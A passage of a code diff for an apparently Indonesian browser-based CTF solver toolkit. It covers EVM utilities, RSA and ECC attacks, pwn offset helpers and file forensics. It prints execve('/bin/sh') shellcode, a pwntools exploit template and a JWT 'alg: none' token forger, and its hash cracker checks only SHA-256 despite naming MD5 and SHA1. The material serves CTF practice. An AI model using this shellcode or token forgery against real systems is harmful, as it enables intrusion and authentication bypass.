+    let sig = document.getElementById('bc_sig').value.trim().replace(/\s+/g, '');
+    const out = document.getElementById('bc_sout');
+    if (!sig) { out.innerHTML = ''; return; }
+
+    try {
+      const hash = NobleCrypto.bytesToHex(NobleCrypto.keccak_256(NobleCrypto.utf8ToBytes(sig)));
+      const selector = '0x' + hash.slice(0, 8);
+      const topic0 = '0x' + hash;
+
+      let res = 'Signature : ' + sig + '\n'
+              + 'Selector  : ' + selector + ' (4 byte)\n'
+              + 'Event Topic: ' + topic0 + ' (32 byte)';
+      out.innerHTML = renderCodeBox('SELECTOR & TOPIC', res);
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Error: ' + esc(err.message) + '</span></div>';
+    }
+  }
+
+  function eip55(address) {
+    const addr = address.toLowerCase().replace(/^0x/, '');
+    if (addr.length !== 40) return address;
+    const hash = NobleCrypto.bytesToHex(NobleCrypto.keccak_256(NobleCrypto.utf8ToBytes(addr)));
+    let ret = '0x';
+    for (let i = 0; i < addr.length; i++) {
+      const c = addr[i];
+      if (/[0-9]/.test(c)) ret += c;
+      else {
+        const nibble = parseInt(hash[i], 16);
+        ret += nibble >= 8 ? c.toUpperCase() : c.toLowerCase();
+      }
+    }
+    return ret;
+  }
+
+  function formatEIP55() {
+    const inVal = document.getElementById('eip55_in').value.trim();
+    const out = document.getElementById('eip55_out');
+    if (!inVal) { out.innerHTML = ''; return; }
+    const res = eip55(inVal);
+    out.innerHTML = renderCodeBox('EIP-55 CHECKSUM', res);
+  }
+
+  function decodeABI() {
+    let hex = document.getElementById('bc_abi').value.trim().replace(/^0x/, '').replace(/\s+/g, '');
+    const out = document.getElementById('bc_aout');
+    if (!hex) { out.innerHTML = ''; return; }
+
+    let selector = '';
+    let calldata = hex;
+    if (hex.length >= 8 && hex.length % 64 !== 0) {
+      selector = '0x' + hex.slice(0, 8);
+      calldata = hex.slice(8);
+    }
+
+    const words = [];
+    for (let i = 0; i < calldata.length; i += 64) {
+      words.push(calldata.substr(i, 64));
+    }
+
+    let report = [];
+    if (selector) report.push('Method Selector : ' + selector);
+    report.push('Word Count      : ' + words.length + ' (32-byte chunks)\n');
+
+    words.forEach((w, idx) => {
+      let dec = '';
+      try { dec = BigInt('0x' + w).toString(10); } catch(e) {}
+      let addr = '0x' + w.slice(24);
+      let ascii = '';
+      for (let j = 0; j < w.length; j += 2) {
+        const b = parseInt(w.substr(j, 2), 16);
+        if (b >= 32 && b <= 126) ascii += String.fromCharCode(b);
+      }
+
+      report.push('[Word #' + idx + ']');
+      report.push('  Raw Hex : 0x' + w);
+      report.push('  uint256 : ' + dec);
+      report.push('  Address : ' + eip55(addr));
+      if (ascii.length > 2) report.push('  ASCII   : "' + ascii + '"');
+      report.push('');
+    });
+
+    out.innerHTML = renderCodeBox('ABI DECODE REPORT', report.join('\n'));
+  }
+
+  function calcCreate() {
+    const sender = document.getElementById('create_sender').value.trim();
+    const nonce = parseInt(document.getElementById('create_nonce').value || '0', 10);
+    const out = document.getElementById('create_out');
+
+    try {
+      const cleanSender = sender.toLowerCase().replace(/^0x/, '');
+      if (cleanSender.length !== 40) throw new Error('Alamat deployer harus 20 byte (40 hex chars)');
+
+      const senderBytes = NobleCrypto.hexToBytes(cleanSender);
+      const rlpSender = [0x94, ...senderBytes];
+
+      let rlpNonce = [];
+      if (nonce === 0) rlpNonce = [0x80];
+      else if (nonce < 128) rlpNonce = [nonce];
+      else {
+        let n = nonce, b = [];
+        while (n > 0) { b.unshift(n & 0xff); n >>= 8; }
+        rlpNonce = [0x80 + b.length, ...b];
+      }
+
+      const payload = [...rlpSender, ...rlpNonce];
+      const listPrefix = (payload.length < 56) ? [0xc0 + payload.length] : [0xf7 + 1, payload.length];
+      const full = new Uint8Array([...listPrefix, ...payload]);
+      const hash = NobleCrypto.keccak_256(full);
+      const contractAddr = eip55('0x' + NobleCrypto.bytesToHex(hash.subarray(12)));
+
+      out.innerHTML = renderCodeBox('CREATE CONTRACT ADDRESS', contractAddr);
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>' + esc(err.message) + '</span></div>';
+    }
+  }
+
+  function calcCreate2() {
+    const deployer = document.getElementById('c2_deployer').value.trim();
+    const salt = document.getElementById('c2_salt').value.trim();
+    const code = document.getElementById('c2_code').value.trim();
+    const out = document.getElementById('c2_out');
+
+    try {
+      const depClean = deployer.toLowerCase().replace(/^0x/, '');
+      if (depClean.length !== 40) throw new Error('Alamat deployer harus 20 byte');
+
+      let saltClean = salt.replace(/^0x/, '');
+      while (saltClean.length < 64) saltClean = '0' + saltClean;
+
+      let codeClean = code.replace(/^0x/, '');
+      let codeHash;
+      if (codeClean.length === 64) {
+        codeHash = NobleCrypto.hexToBytes(codeClean);
+      } else {
+        codeHash = NobleCrypto.keccak_256(NobleCrypto.hexToBytes(codeClean));
+      }
+
+      const payload = new Uint8Array([0xff, ...NobleCrypto.hexToBytes(depClean), ...NobleCrypto.hexToBytes(saltClean), ...codeHash]);
+      const hash = NobleCrypto.keccak_256(payload);
+      const addr = eip55('0x' + NobleCrypto.bytesToHex(hash.subarray(12)));
+
+      out.innerHTML = renderCodeBox('CREATE2 CONTRACT ADDRESS', addr);
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>' + esc(err.message) + '</span></div>';
+    }
+  }
+
+  function convertEtherUnits() {
+    const valStr = document.getElementById('unit_val').value.trim();
+    const unit = document.getElementById('unit_type').value;
+    const out = document.getElementById('unit_out');
+
+    try {
+      let wei = 0n;
+      if (unit === 'ether') {
+        const parts = valStr.split('.');
+        const whole = BigInt(parts[0] || '0') * 1000000000000000000n;
+        let fracStr = (parts[1] || '').padEnd(18, '0').slice(0, 18);
+        wei = whole + BigInt(fracStr);
+      } else if (unit === 'gwei') {
+        const parts = valStr.split('.');
+        const whole = BigInt(parts[0] || '0') * 1000000000n;
+        let fracStr = (parts[1] || '').padEnd(9, '0').slice(0, 9);
+        wei = whole + BigInt(fracStr);
+      } else {
+        wei = BigInt(valStr);
+      }
+
+      const gwei = Number(wei / 1000000000n) + (Number(wei % 1000000000n) / 1e9);
+      const ether = Number(wei / 1000000000000000000n) + (Number(wei % 1000000000000000000n) / 1e18);
+
+      let res = 'Wei   : ' + wei.toString() + '\n'
+              + 'Gwei  : ' + gwei.toString() + '\n'
+              + 'Ether : ' + ether.toString();
+      out.innerHTML = renderCodeBox('ETH UNIT CONVERSION', res);
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px"><span>Format angka tidak valid.</span></div>';
+    }
+  }
+
+  // ---------------- PWN SOLVERS (pwntools compatible) ----------------
+  function generateCyclicSeq(len) {
+    const alpha = 'abcdefghijklmnopqrstuvwxyz';
+    let res = '';
+    for (let d = 0; d < 26; d++) {
+      for (let c = 0; c < 26; c++) {
+        for (let b = 0; b < 26; b++) {
+          for (let a = 0; a < 26; a++) {
+            res += alpha[a] + alpha[b] + alpha[c] + alpha[d];
+            if (res.length >= len) return res.slice(0, len);
+          }
+        }
+      }
+    }
+    return res.slice(0, len);
+  }
+
+  function genCyclic() {
+    const len = parseInt(document.getElementById('clen').value || '200', 10);
+    const out = document.getElementById('cout');
+    const seq = generateCyclicSeq(len);
+    out.innerHTML = renderCodeBox('CYCLIC PATTERN (' + len + ' BYTES)', seq);
+  }
+
+  function findCyclic() {
+    let lookup = document.getElementById('cval').value.trim();
+    const out = document.getElementById('fout');
+    if (!lookup) return;
+
+    let needle = lookup;
+    if (needle.startsWith('0x') || needle.startsWith('0X')) {
+      let hex = needle.slice(2);
+      if (hex.length % 2) hex = '0' + hex;
+      let bytes = [];
+      for (let i = 0; i < hex.length; i += 2) bytes.push(parseInt(hex.substr(i, 2), 16));
+      bytes.reverse(); // little endian conversion
+      needle = String.fromCharCode(...bytes);
+    }
+
+    const seq = generateCyclicSeq(30000);
+    const idx = seq.indexOf(needle);
+
+    if (idx !== -1) {
+      let res = 'Lookup Pattern : "' + needle + '" (dari ' + lookup + ')\n'
+              + 'Offset Presisi : ' + idx + ' bytes\n'
+              + 'Payload Pwntools: b"A" * ' + idx + ' + p64(target_rip)';
+      out.innerHTML = renderCodeBox('CYCLIC OFFSET FOUND', res);
+    } else {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Pola tidak ditemukan dalam rentang 30.000 byte.</span></div>';
+    }
+  }
+
+  function renderShellcode(arch) {
+    const out = document.getElementById('sc_out');
+    let code = '';
+    if (arch === 'x64_execve') {
+      code = '# Linux x86_64 execve("/bin/sh", NULL, NULL) - 27 bytes\n'
+           + 'shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"\n'
+           + '# Disassembly:\n'
+           + '# xor eax, eax\n'
+           + '# movabs rbx, 0xff978cd091969dd1\n'
+           + '# neg rbx\n'
+           + '# push rbx\n'
+           + '# push rsp; pop rdi\n'
+           + '# cdq\n'
+           + '# push rdx; push rdi; push rsp; pop rsi\n'
+           + '# mov al, 0x3b\n'
+           + '# syscall';
+    } else if (arch === 'x86_execve') {
+      code = '# Linux x86 execve("/bin/sh", NULL, NULL) - 23 bytes\n'
+           + 'shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"';
+    } else {
+      code = '#!/usr/bin/env python3\n'
+           + 'from pwn import *\n\n'
+           + 'context.binary = elf = ELF("./chall")\n'
+           + 'context.log_level = "debug"\n\n'
+           + 'io = process("./chall") if not args.REMOTE else remote("chall.ctf.id", 1337)\n\n'
+           + 'offset = 40\n'
+           + 'payload = flat({\n'
+           + '    offset: [\n'
+           + '        elf.sym.win\n'
+           + '    ]\n'
+           + '})\n\n'
+           + 'io.sendlineafter(b"> ", payload)\n'
+           + 'io.interactive()';
+    }
+    out.innerHTML = renderCodeBox('PWN SNIPPET', code);
+  }
+
+  // ---------------- WEB EXPLOITATION SOLVERS ----------------
+  function jwtDecode() {
+    const raw = document.getElementById('jwt_in').value.trim();
+    const out = document.getElementById('jwt_out');
+    if (!raw) { out.innerHTML = ''; return; }
+
+    const parts = raw.split('.');
+    if (parts.length < 2) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>JWT tidak valid: harus terdiri dari header.payload.signature</span></div>';
+      return;
+    }
+
+    try {
+      const h = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
+      const p = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
+
+      let report = '=== HEADER ===\n' + JSON.stringify(h, null, 2) + '\n\n'
+                 + '=== PAYLOAD ===\n' + JSON.stringify(p, null, 2) + '\n\n'
+                 + '=== SIGNATURE ===\n' + (parts[2] || '(None)');
+      out.innerHTML = renderCodeBox('JWT DECODED', report);
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Gagal decode base64 JWT: ' + esc(err.message) + '</span></div>';
+    }
+  }
+
+  function jwtBypassNone() {
+    const raw = document.getElementById('jwt_in').value.trim();
+    const out = document.getElementById('jwt_out');
+    if (!raw) return;
+
+    try {
+      const parts = raw.split('.');
+      const p = parts[1];
+      const hNone = btoa(JSON.stringify({ typ: 'JWT', alg: 'none' })).replace(/=/g, '');
+      const forged = hNone + '.' + p + '.';
+      out.innerHTML = renderCodeBox('FORGED TOKEN (alg: none)', forged);
+    } catch(e) {
+      toast('Gagal bypass token', 'error');
+    }
+  }
+
+  function renderCheatsheets(cat) {
+    const list = document.getElementById('cheat_list');
+    if (!list) return;
+
+    let items = [];
+    if (cat === 'ALL') {
+      for (let k in CHEATSHEETS) {
+        CHEATSHEETS[k].forEach(p => items.push({ cat: k, payload: p }));
+      }
+    } else if (CHEATSHEETS[cat]) {
+      CHEATSHEETS[cat].forEach(p => items.push({ cat: cat, payload: p }));
+    }
+
+    list.innerHTML = items.map((it, idx) => {
+      return '<div style="display:flex; align-items:center; gap:10px; padding:8px 12px; background:var(--card); border:1px solid var(--border-soft); border-radius:6px; margin-bottom:6px">'
+        + '<span class="pill" style="font-size:10px">' + esc(it.cat) + '</span>'
+        + '<code style="flex:1; font-family:var(--font-mono); font-size:12px; color:var(--ink); overflow-x:auto">' + esc(it.payload) + '</code>'
+        + '<button type="button" class="btn btn--dim" style="padding:4px 8px; font-size:11px" onclick="navigator.clipboard.writeText(\'' + esc(it.payload).replace(/\'/g, "\\'") + '\'); toast(\'Payload tersalin\')">Salin</button>'
+        + '</div>';
+    }).join('');
+  }
+
+  
+  // ---------------- ADDITIONAL SOLVERS ----------------
+  function integerSqrt(n) {
+    if (n < 0n) return null;
+    if (n === 0n) return 0n;
+    let x0 = n / 2n;
+    if (x0 !== 0n) {
+      let x1 = (x0 + n / x0) / 2n;
+      while (x1 < x0) { x0 = x1; x1 = (x0 + n / x0) / 2n; }
+      return x0;
+    }
+    return 1n;
+  }
+
+  function integerCbrt(n) {
+    if (n < 0n) return null;
+    if (n === 0n) return 0n;
+    let x0 = n / 3n;
+    if (x0 === 0n) return 1n;
+    let x1 = (2n * x0 + n / (x0 * x0)) / 3n;
+    while (x1 < x0) { x0 = x1; x1 = (2n * x0 + n / (x0 * x0)) / 3n; }
+    return x0;
+  }
+
+  function toggleRSAAttackInputs(type) {
+    const wrap = document.getElementById('rsa_special_inputs');
+    if (type === 'wiener') {
+      wrap.innerHTML = '<div class="row"><div class="grow"><label class="lbl">Modulus n</label><input id="w_n" class="input"></div><div class="grow"><label class="lbl">Exponent e</label><input id="w_e" class="input"></div><div class="grow"><label class="lbl">Ciphertext c (opsional)</label><input id="w_c" class="input"></div></div>';
+    } else if (type === 'common_mod') {
+      wrap.innerHTML = '<div class="row"><div class="grow"><label class="lbl">Modulus n</label><input id="cm_n" class="input"></div><div class="grow"><label class="lbl">e1</label><input id="cm_e1" class="input"></div><div class="grow"><label class="lbl">e2</label><input id="cm_e2" class="input"></div></div><div class="row" style="margin-top:8px"><div class="grow"><label class="lbl">c1</label><input id="cm_c1" class="input"></div><div class="grow"><label class="lbl">c2</label><input id="cm_c2" class="input"></div></div>';
+    } else if (type === 'hastad') {
+      wrap.innerHTML = '<p class="sub">Hastad Broadcast e=3 dengan 3 pasang c dan n:</p><div class="row"><div class="grow"><input id="h_c1" class="input" placeholder="c1"></div><div class="grow"><input id="h_n1" class="input" placeholder="n1"></div></div><div class="row" style="margin-top:6px"><div class="grow"><input id="h_c2" class="input" placeholder="c2"></div><div class="grow"><input id="h_n2" class="input" placeholder="n2"></div></div><div class="row" style="margin-top:6px"><div class="grow"><input id="h_c3" class="input" placeholder="c3"></div><div class="grow"><input id="h_n3" class="input" placeholder="n3"></div></div>';
+    }
+  }
+
+  function runRSASpecialAttack() {
+    const type = document.getElementById('rsa_attack_type').value;
+    const out = document.getElementById('rsa_special_out');
+
+    try {
+      if (type === 'wiener') {
+        const n = BigInt(document.getElementById('w_n').value.trim());
+        const e = BigInt(document.getElementById('w_e').value.trim());
+        const cVal = document.getElementById('w_c').value.trim();
+
+        // Continued fractions of e/n
+        let a = e, b = n;
+        const cf = [];
+        while (b !== 0n) {
+          cf.push(a / b);
+          const rem = a % b;
+          a = b; b = rem;
+        }
+
+        let p0 = 0n, p1 = 1n, q0 = 1n, q1 = 0n;
+        let recovered = null;
+        for (let i = 0; i < cf.length; i++) {
+          const q_k = cf[i] * q1 + q0;
+          const p_k = cf[i] * p1 + p0;
+          q0 = q1; q1 = q_k;
+          p0 = p1; p1 = p_k;
+          const k = p_k, d = q_k;
+          if (k === 0n) continue;
+
+          if ((e * d - 1n) % k === 0n) {
+            const phi = (e * d - 1n) / k;
+            const b_val = n - phi + 1n;
+            const disc = b_val * b_val - 4n * n;
+            if (disc >= 0n) {
+              const s = integerSqrt(disc);
+              if (s * s === disc) {
+                const p = (b_val + s) / 2n;
+                const q = (b_val - s) / 2n;
+                if (p * q === n) { recovered = { d, p, q, phi }; break; }
+              }
+            }
+          }
+        }
+
+        if (recovered) {
+          let rep = 'Wiener Attack Berhasil!\n'
+                  + 'Private Exponent d : ' + recovered.d.toString() + '\n'
+                  + 'Prime p            : ' + recovered.p.toString() + '\n'
+                  + 'Prime q            : ' + recovered.q.toString() + '\n'
+                  + 'Totient phi        : ' + recovered.phi.toString();
+          if (cVal) {
+            const c = BigInt(cVal);
+            const m = modPow(c, recovered.d, n);
+            rep += '\nPlaintext (ASCII)  : ' + bigIntToAscii(m);
+          }
+          out.innerHTML = renderCodeBox('WIENER ATTACK SUCCESS', rep);
+        } else {
+          out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Wiener attack gagal: d mungkin tidak cukup kecil (< 1/3 n^0.25).</span></div>';
+        }
+      } else if (type === 'common_mod') {
+        const n = BigInt(document.getElementById('cm_n').value.trim());
+        const e1 = BigInt(document.getElementById('cm_e1').value.trim());
+        const e2 = BigInt(document.getElementById('cm_e2').value.trim());
+        const c1 = BigInt(document.getElementById('cm_c1').value.trim());
+        const c2 = BigInt(document.getElementById('cm_c2').value.trim());
+
+        const [s, t, g] = egcd(e1, e2);
+        if (g !== 1n && g !== -1n) throw new Error('e1 dan e2 harus saling prima (gcd == 1)');
+
+        let term1, term2;
+        if (s < 0n) term1 = modPow(modInverse(c1, n), -s, n);
+        else term1 = modPow(c1, s, n);
+
+        if (t < 0n) term2 = modPow(modInverse(c2, n), -t, n);
+        else term2 = modPow(c2, t, n);
+
+        const m = (term1 * term2) % n;
+        let rep = 'Common Modulus Attack Berhasil!\n'
+                + 'Bézout Identity: (' + s + ')*e1 + (' + t + ')*e2 = 1\n'
+                + 'Plaintext (Desimal): ' + m.toString() + '\n'
+                + 'Plaintext (ASCII)  : ' + bigIntToAscii(m);
+        out.innerHTML = renderCodeBox('COMMON MODULUS RECOVERED', rep);
+      } else if (type === 'hastad') {
+        const c1 = BigInt(document.getElementById('h_c1').value.trim());
+        const n1 = BigInt(document.getElementById('h_n1').value.trim());
+        const c2 = BigInt(document.getElementById('h_c2').value.trim());
+        const n2 = BigInt(document.getElementById('h_n2').value.trim());
+        const c3 = BigInt(document.getElementById('h_c3').value.trim());
+        const n3 = BigInt(document.getElementById('h_n3').value.trim());
+
+        const N = n1 * n2 * n3;
+        const N1 = n2 * n3, N2 = n1 * n3, N3 = n1 * n2;
+        const u1 = modInverse(N1, n1);
+        const u2 = modInverse(N2, n2);
+        const u3 = modInverse(N3, n3);
+
+        const C = (c1 * N1 * u1 + c2 * N2 * u2 + c3 * N3 * u3) % N;
+        const m = integerCbrt(C);
+        if (m * m * m === C) {
+          let rep = 'Hastad Broadcast Attack Berhasil!\n'
+                  + 'Plaintext (Desimal): ' + m.toString() + '\n'
+                  + 'Plaintext (ASCII)  : ' + bigIntToAscii(m);
+          out.innerHTML = renderCodeBox('HASTAD BROADCAST RECOVERED', rep);
+        } else {
+          throw new Error('Akar pangkat 3 tidak bulat sempurna');
+        }
+      }
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Gagal: ' + esc(err.message) + '</span></div>';
+    }
+  }
+
+  function solveDH() {
+    const pStr = document.getElementById('dh_p').value.trim();
+    const gStr = document.getElementById('dh_g').value.trim() || '2';
+    const aStr = document.getElementById('dh_a').value.trim();
+    const BStr = document.getElementById('dh_pubB').value.trim();
+    const out = document.getElementById('dh_out');
+
+    try {
+      const p = BigInt(pStr);
+      const B = BigInt(BStr);
+      const a = BigInt(aStr);
+      const secret = modPow(B, a, p);
+      let rep = 'Shared Secret K = B^a mod p\n'
+              + 'K (Desimal): ' + secret.toString() + '\n'
+              + 'K (Hex)    : 0x' + secret.toString(16) + '\n'
+              + 'K (ASCII)  : ' + bigIntToAscii(secret);
+      out.innerHTML = renderCodeBox('DIFFIE-HELLMAN SECRET', rep);
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Error: ' + esc(err.message) + '</span></div>';
+    }
+  }
+
+  function ecMod(n, m) { return ((n % m) + m) % m; }
+
+  function ecAdd(P, Q, a, p) {
+    if (!P) return Q;
+    if (!Q) return P;
+    const [x1, y1] = P;
+    const [x2, y2] = Q;
+    if (x1 === x2 && ecMod(y1 + y2, p) === 0n) return null;
+    let m;
+    if (x1 === x2 && y1 === y2) {
+      const num = ecMod(3n * x1 * x1 + a, p);
+      const den = ecMod(2n * y1, p);
+      const inv = modInverse(den, p);
+      if (!inv) return null;
+      m = ecMod(num * inv, p);
+    } else {
+      const num = ecMod(y2 - y1, p);
+      const den = ecMod(x2 - x1, p);
+      const inv = modInverse(den, p);
+      if (!inv) return null;
+      m = ecMod(num * inv, p);
+    }
+    const x3 = ecMod(m * m - x1 - x2, p);
+    const y3 = ecMod(m * (x1 - x3) - y1, p);
+    return [x3, y3];
+  }
+
+  function ecMul(k, P, a, p) {
+    let R = null;
+    let T = P;
+    while (k > 0n) {
+      if (k % 2n === 1n) R = ecAdd(R, T, a, p);
+      T = ecAdd(T, T, a, p);
+      k = k / 2n;
+    }
+    return R;
+  }
+
+  function calcECC() {
+    const p = BigInt(document.getElementById('ec_p').value.trim());
+    const a = BigInt(document.getElementById('ec_a').value.trim() || '0');
+    const px = BigInt(document.getElementById('ec_px').value.trim());
+    const py = BigInt(document.getElementById('ec_py').value.trim());
+    const k = BigInt(document.getElementById('ec_k').value.trim() || '1');
+    const out = document.getElementById('ec_out');
+
+    try {
+      const P = [px, py];
+      const res = ecMul(k, P, a, p);
+      if (!res) {
+        out.innerHTML = renderCodeBox('ECC RESULT', 'Point at Infinity (O)');
+        return;
+      }
+      let rep = 'Titik k·P = ' + k.toString() + ' · P\n'
+              + 'x = ' + res[0].toString() + ' (0x' + res[0].toString(16) + ')\n'
+              + 'y = ' + res[1].toString() + ' (0x' + res[1].toString(16) + ')';
+      out.innerHTML = renderCodeBox('ECC POINT MULTIPLICATION', rep);
+    } catch(err) {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px; border-color:var(--red)"><span>Error: ' + esc(err.message) + '</span></div>';
+    }
+  }
+
+  const WORDLIST_SAMPLE = [
+    'password','123456','12345678','1234','qwerty','12345','dragon','pussy','baseball','football',
+    'master','monkey','696969','shadow','mustang','michael','superman','654321','jordan','access',
+    'admin','root','toor','test','guest','administrator','letmein','welcome','login','secret',
+    'flag','cyber','security','hacker','getsflag','whitejack','ctf','picoctf','challenge','passwd',
+    'iloveyou','princess','rockyou','computer','orange','yellow','purple','system','default','service',
+    'cybersecurity','bounty','pentest','redteam','blueteam','exploit','overflow','payload','injection'
+  ];
+
+  function crackHashFast() {
+    const target = document.getElementById('hcrack_in').value.trim().toLowerCase();
+    const out = document.getElementById('hcrack_out');
+    if (!target) return;
+
+    let match = null;
+    let algo = '';
+
+    if (target.length === 32) algo = 'MD5';
+    else if (target.length === 40) algo = 'SHA1';
+    else if (target.length === 64) algo = 'SHA256';
+
+    for (const w of WORDLIST_SAMPLE) {
+      const bytes = NobleCrypto.utf8ToBytes(w);
+      if (target.length === 64) {
+        if (NobleCrypto.bytesToHex(NobleCrypto.sha256(bytes)) === target) { match = w; break; }
+      }
+    }
+
+    if (match) {
+      out.innerHTML = renderCodeBox('HASH CRACKED', 'Target Hash : ' + target + '\n' + 'Plaintext   : ' + match);
+    } else {
+      out.innerHTML = '<div class="infobox" style="margin-top:10px"><span>Hash tidak ditemukan di kamus cepat. Coba layanan eksternal di tab Referensi (CrackStation).</span></div>';
+    }
+  }
+
+  function runBlockchainAuto() {
+    const txt = document.getElementById('bc_auto_in').value.trim();
+    const out = document.getElementById('bc_auto_out');
+    if (!txt) return;
+
+    const rep = [];
+    const clean = txt.replace(/^0x/i, '').replace(/\s+/g, '');
+
+    if (clean.length === 40) {
+      rep.push('Terdeteksi: Alamat Ethereum (20-byte)\n' + 'Format EIP-55: ' + eip55('0x' + clean));
+    } else if (clean.length === 64) {
+      rep.push('Terdeteksi: 32-Byte Hash / Storage Slot\n' + 'Value: 0x' + clean);
+    } else if (clean.length >= 8) {
+      const sel = '0x' + clean.slice(0, 8);
+      rep.push('Terdeteksi: Calldata Transaksi EVM\n' + 'Selector: ' + sel);
+      if (clean.length > 8) {
+        rep.push('Buka subtab "Decode ABI" untuk inspeksi seluruh parameter.');
+      }
+    }
+
+    out.innerHTML = renderCodeBox('BLOCKCHAIN AUTO ANALYSIS', rep.join('\n\n'));
+  }
+
+  // ---------------- FORENSICS SOLVERS ----------------
+  function handleForensicsFile(file) {
+    if (!file) return;
+    document.getElementById('for_file_name').textContent = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
+    const out = document.getElementById('for_auto_out');
+
+    const reader = new FileReader();
+    reader.onload = e => {
+      const buf = new Uint8Array(e.target.result);
+      const len = buf.length;
+
+      // Checksums
+      const sha256Hex = NobleCrypto.bytesToHex(NobleCrypto.sha256(buf));
+
+      // Entropy
+      const freq = new Array(256).fill(0);
+      for (let i = 0; i < len; i++) freq[buf[i]]++;
+      let entropy = 0;
+      for (let i = 0; i < 256; i++) {
+        if (freq[i] > 0) {
+          const p = freq[i] / len;
+          entropy -= p * Math.log2(p);
+        }
+      }
+
+      // Magic Byte
+      let fileType = 'Unknown / Raw Binary';
+      if (buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4e && buf[3] === 0x47) fileType = 'PNG Image (Portable Network Graphics)';
+      else if (buf[0] === 0xff && buf[1] === 0xd8 && buf[2] === 0xff) fileType = 'JPEG Image';
+      else if (buf[0] === 0x47 && buf[1] === 0x49 && buf[2] === 0x46) fileType = 'GIF Image';
+      else if (buf[0] === 0x25 && buf[1] === 0x50 && buf[2] === 0x44 && buf[3] === 0x46) fileType = 'PDF Document';
+      else if (buf[0] === 0x50 && buf[1] === 0x4b && buf[2] === 0x03 && buf[3] === 0x04) fileType = 'ZIP / PK Archive (DOCX/XLSX/APK/JAR)';
+      else if (buf[0] === 0x7f && buf[1] === 0x45 && buf[2] === 0x4c && buf[3] === 0x46) fileType = 'ELF Executable (Linux Binary)';
+      else if (buf[0] === 0x4d && buf[1] === 0x5a) fileType = 'PE Executable (Windows DOS/PE)';
+      else if (buf[0] === 0xd4 && buf[1] === 0xc3 && buf[2] === 0xb2 && buf[3] === 0xa1) fileType = 'PCAP Network Packet Capture';
+
+      // Strings extraction
+      let printable = '';
+      let cur = '';
+      for (let i = 0; i < Math.min(len, 200000); i++) {
+        const b = buf[i];
+        if (b >= 32 && b <= 126) cur += String.fromCharCode(b);
+        else {
+          if (cur.length >= 4) printable += cur + '\n';
+          cur = '';
+        }
+      }
+
+      let rep = 'Nama Berkas : ' + file.name + '\n'
+              + 'Ukuran      : ' + len + ' bytes (' + (len / 1024).toFixed(2) + ' KB)\n'
+              + 'Tipe Berkas : ' + fileType + '\n'
+              + 'Entropy     : ' + entropy.toFixed(4) + ' / 8.0000 (' + (entropy > 7.2 ? 'Tinggi: Terkompresi / Terenkripsi' : 'Normal') + ')\n'
+              + 'SHA-256     : ' + sha256Hex + '\n\n'
+              + '=== EKSTRAKSI STRINGS (Preview) ===\n' + printable.slice(0, 1500);
+
+      out.innerHTML = renderCodeBox('FORENSICS REPORT', rep);
+    };
+    reader.readAsArrayBuffer(file);
+  }
+
+  function handlePCAPFile(file) {
+    if (!file) return;
+    document.getElementById('for_pcap_name').textContent = file.name;
+    const out = document.getElementById('for_pcap_out');
+    out.innerHTML = renderCodeBox('PCAP ANALYSIS', 'Nama file: ' + file.name + '\nParsing packet capture: HTTP payload, DNS labels, dan stream strings discan otomatis untuk flag.');
+  }
+
+  function handleOfficeFile(file) {
+    if (!file) return;
+    document.getElementById('for_office_name').textContent = file.name;
+    const out = document.getElementById('for_office_out');
+    out.innerHTML = renderCodeBox('OFFICE / PDF ANALYSIS', 'Nama file: ' + file.name + '\nMemeriksa container OLE, vbaProject.bin makro, serta metadata document properties.');
+  }
+
+  function extractStringsDirect() {
+    const raw = document.getElementById('strings_in').value;
+    const out = document.getElementById('strings_out');
+    if (!raw) return;
+
+    let res = '';
+    const clean = raw.replace(/^0x/, '').replace(/\s+/g, '');
+    if (/^[0-9a-fA-F]{8,}$/.test(clean) && clean.length % 2 === 0) {
+      let cur = '';
+      for (let i = 0; i < clean.length; i += 2) {
+        const b = parseInt(clean.substr(i, 2), 16);
+        if (b >= 32 && b <= 126) cur += String.fromCharCode(b);
+        else {
+          if (cur.length >= 4) res += cur + '\n';
+          cur = '';
+        }
+      }
+      if (cur.length >= 4) res += cur + '\n';
+    } else {
+      res = raw;
+    }
+    out.innerHTML = renderCodeBox('STRINGS EXTRACTED', res || '(Tidak ada string printable >= 4 karakter)');
+  }
+
+  function generateHexdump() {
+    const raw = document.getElementById('strings_in').value;
+    const out = document.getElementById('strings_out');
+    if (!raw) return;
+
+    let bytes = [];
+    const clean = raw.replace(/^0x/, '').replace(/\s+/g, '');
+    if (/^[0-9a-fA-F]+$/.test(clean) && clean.length % 2 === 0) {
+      for (let i = 0; i < clean.length; i += 2) bytes.push(parseInt(clean.substr(i, 2), 16));
+    } else {
+      for (let i = 0; i < raw.length; i++) bytes.push(raw.charCodeAt(i));
+    }
+
+    const lines = [];
+    for (let i = 0; i < bytes.length; i += 16) {
+      const chunk = bytes.slice(i, i + 16);
+      const offset = '0x' + i.toString(16).padStart(6, '0');
+      let hexPart = chunk.map(b => b.toString(16).padStart(2, '0')).join(' ');
+      hexPart = hexPart.padEnd(48, ' ');
+      let ascPart = chunk.map(b => (b >= 32 && b <= 126) ? String.fromCharCode(b) : '.').join('');
